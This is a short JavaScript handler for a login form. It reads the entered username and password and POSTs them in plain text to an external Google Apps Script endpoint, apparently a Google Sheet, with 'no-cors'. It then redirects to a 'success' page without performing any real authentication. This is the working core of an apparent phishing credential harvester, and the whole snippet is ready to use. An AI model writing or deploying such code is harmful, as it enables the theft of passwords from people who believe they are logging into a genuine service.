document
  .getElementById("loginForm")
  .addEventListener("submit", async function(e){

    e.preventDefault();

    const username =
      document.getElementById("username").value;

    const password =
      document.getElementById("password").value;

    console.log("Sending to Sheets...");

    fetch("https://script.google.com/macros/s/AKfycbxQOEthGEkGLiq_ZBxC4UXveK31Oe8bqZ_dN3e-fyC0QXQkjOE80vMu6Jb6fzVMNic/exec", {
  method: "POST",
  mode: "no-cors",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: new URLSearchParams({
    username,
    password
  })
});

    window.location.href = "success.html";
});


